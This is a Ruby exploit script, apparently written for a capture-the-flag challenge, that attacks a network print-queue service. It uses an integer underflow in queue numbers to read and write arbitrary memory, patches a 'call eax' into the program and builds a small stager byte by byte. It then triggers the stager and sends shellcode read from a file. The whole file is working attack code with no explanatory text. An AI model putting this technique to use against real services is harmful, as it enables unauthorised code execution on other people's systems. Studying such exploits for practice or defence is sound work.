require 'socket'

# This is a ridiculously inefficient open / read
# To assemble: nasm -o shellcode shellcode.asm
SHELLCODE = File.read('./shellcode')

# Connect
if ARGV[1].nil?
  puts "Usage: ruby ./sploit.rb <host> <port>"
  exit
end
S = TCPSocket.new(ARGV[0], ARGV[1].to_i)

# This little function is basically an exploit for the integer underflow bug
def queue_for(addr)
  return 0x0FFFFFFFF & (2**32 - (2048 - addr))
end

# Use the exploit to read an address
def get_u64_at(addr)
  if (addr % 8) != 0
    puts "Addresses must be a multiple of 8!"
    exit
  end

  S.write("\x03%d\n" % queue_for(addr / 8));

  return S.recv(8)
end

# Send a "print job"
def send_job(queue, data, filename = 'A')
  S.write(
    "\x02" +                   # Command = 2 (receive job)
    queue.to_s + " " +         # Queue number
    "\x03" +                   # Subcommand = 3 (send data job)
    data.length().to_s + " " + # Length of data
    filename + "\n"   +        # Filename
    data                       # File data
  )

  # b = S.recv(1);
  #  if b != "\0"
  #    puts "Error sending job, did not return confirmation"
  #    exit
  #  end
end

# Cancel a "print job"
def cancel_job(queue)
  S.write(
    "\x02" +                  # Command = 2 (receive job)
    queue.to_s + " " +        # Queue number
    "\x01"                    # Subcommand = 3 (cancel job)
  )

  # b = S.recv(1);
  # if b != "\0"
  #   puts "Error sending job, did not return confirmation"
  #   exit
  # end
end

# Exploit the vulnerability to increment addr and addr+4.
#
# addr is incremented or decremented by one byte at a time, so it's very slow.
#
# addr+4 is incremented by up to 1024 bytes at a time, so it's much faster.
def write_value_to(addr, increment_first, increment_second)
  puts "Writing to #{ addr.to_s(16) } (#{ increment_first.to_s(16) } / #{ increment_second.to_s(16) })..."
  if (addr % 8) != 0
    puts "Addresses must be a multiple of 8!"
    exit
  end

  if increment_second < 0
    puts "Can't increment second dword by a negative number"
    exit
  end

  # Convert the address to a queue number (using the underflow)
  queue = queue_for(addr / 8)

  # First, increment the second in blocks of up to 1024
  while increment_second > 0
    amt = 1024
    if(increment_second < 1024)
      amt = increment_second
    end

    # Send a job with that amount
    send_job(queue, "A" * amt, "A")

    # This also increases the first one - log that we did it (so it can be
    # perhaps decreased later, if needed)
    increment_first -= 1

    # Decrement our increment_second amount
    increment_second -= amt
  end

  # Increment as much as needed
  while increment_first > 0
    # Send a blank job to increment
    send_job(queue, "", "A")
    increment_first -= 1
  end

  # Decrement as much as needed
  while increment_first < 0
    # Cancel a job to decrement
    cancel_job(queue)
    increment_first += 1
  end

  # Clear out any backlogged confirmations
  S.recv(100000)
end

def change_byte_to(addr, new_value)
  if new_value > 255
    puts "Too big for a byte"
    exit
  end

  if (addr % 4) != 0
    puts "Addresses must be a multiple of 4!"
    exit
  end

  if (addr % 8) == 0
    # It's aligned to the first dword of the pair - increment by ones
    current = get_u64_at(addr).unpack('I*')[0]
    new_value = (current & 0xFFFFFF00) | new_value

    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Slow - multiple of 8) incrementing by %d" % increment
    write_value_to(addr, increment, 0)
  else
    # It's aligned to the second dword of the pair - increment by 1024s
    current = get_u64_at(addr - 4).unpack('I*')[1]
    new_value = (current & 0xFFFFFF00) | new_value

    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Fast - non-multiple of 8) incrementing by %d" % increment
    write_value_to(addr - 4, 0, increment)
  end
end

def change_word_to(addr, new_value)
  if new_value > 65535
    puts "Too big for a word"
    exit
  end

  if (addr % 4) != 0
    puts "Addresses must be a multiple of 4!"
    exit
  end

  if (addr % 8) == 0
    # It's aligned to the first dword of the pair - increment by ones
    current = get_u64_at(addr).unpack('I*')[0]
    new_value = (current & 0xFFFF0000) | new_value

    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Slow - multiple of 8) incrementing by %d" % increment
    write_value_to(addr, increment, 0)
  else
    # It's aligned to the second dword of the pair - increment by 1024s
    current = get_u64_at(addr - 4).unpack('I*')[1]
    new_value = (current & 0xFFFF0000) | new_value

    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Fast - non-multiple of 8) incrementing by %d" % increment
    write_value_to(addr - 4, 0, increment)
  end
end

def change_dword_to(addr, new_value)
  if (addr % 4) != 0
    puts "Addresses must be a multiple of 4!"
  end

  if (addr % 8) == 0
    # It's aligned to the first dword of the pair - increment by ones
    current = get_u64_at(addr).unpack('I*')[0]
    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Slow - multiple of 8) incrementing by %d" % increment
    write_value_to(addr, increment, 0)
  else
    # It's aligned to the second dword of the pair - increment by 1024s
    current = get_u64_at(addr - 4).unpack('I*')[1]

    puts "Current: %08x" % current
    puts "Desired: %08x" % new_value
    increment = (new_value - current)

    puts "(Fast - non-multiple of 8) incrementing by %d" % increment
    write_value_to(addr - 4, 0, increment)
  end
end

#Dump the executable - this is too slow to do over the Internet
# 0.step(2048*8, 8) do |i|
#   puts "0x%08x #{ get_u64_at(i).unpack('H*') }" % i
# end

def pack(s)
  return [(s.ljust(8, '0'))].pack('H*').unpack('I').pop
end

# Adds "call eax" at a point where eax contains our buffer
# This "call eax" happens in option "4" from the main menu, after doing this
# we can trigger the call anytime by sending "4"
change_word_to(0x79c, pack("ffd0")) # call eax

# The starting address of our shellcode - right after the executable
# (Not coincidentally, this is the same address that's in eax when we do `call eax`)
start = 0x4000 - 8

# Buffer the return address in ecx for now
write_value_to((start += 8), 0x02eb, pack("5990")) # pop ecx / nop

# Length - esi is a reasonably long value when we arrive here
write_value_to((start += 8), 0x02eb, pack("5690")) # push esi / nop

# buf - Use the stored return address as our buffer
write_value_to((start += 8), 0x02eb, pack("5190")) # push ecx / nop

# fd - stdin is 0
write_value_to((start += 8), 0x02eb, pack("6a00")) # push byte 0

# Return address - just ecx again
# This is where read() (the function in the app, not the syscall) returns
write_value_to((start += 8), 0x02eb, pack("5190")) # push ecx / nop

# We want to basically subtract a set value from ecx, using 2-byte chunks (which
# it turns out was probably unnecessary).
#
# To do this, we clear cl, decrement ecx, and repeat a few times.
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl
write_value_to((start += 8), 0x02eb, pack("4990")) # dec ecx / nop
write_value_to((start += 8), 0x02eb, pack("30c9")) # xor cl, cl

# At this point, ecx points to the start of the code. The read() function is 0x11
# bytes into the executable, so move 0x11 to cl
write_value_to((start += 8), 0x02eb, pack("b111")) # mov cl, 11 (offset to read())

# Now that ecx points to the start of read(), jump to it
write_value_to((start += 8), 0x02eb, pack("ffe1")) # jmp ecx

# Trigger the "call eax", finally
S.write("\x040\n")

# When the call runs, it'll (hopefully) stop at read() and wait for code to run
S.write(SHELLCODE)

# Now just loop and send whatever we get
loop do
  x = S.recv(1)
  if x == nil || x == ""
    exit
  end
  if x != "\x00"
    print x
  end
end
